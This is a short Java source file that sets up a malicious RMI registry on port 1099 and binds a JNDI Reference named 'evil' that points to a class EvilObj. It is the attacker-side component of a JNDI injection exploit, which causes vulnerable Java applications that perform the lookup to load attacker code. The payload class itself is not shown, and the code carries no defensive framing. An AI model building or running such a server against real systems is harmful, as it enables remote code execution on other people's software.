package com.jiuzhe.webflux;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        System.out.println("create rmi in port 1099");
        Reference reference = new Reference("com.jiuzhe.webflux.EvilObj", "com.jiuzhe.webflux.EvilObj","com.jiuzhe.webflux.EvilObj");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("evil", referenceWrapper);
    }
}
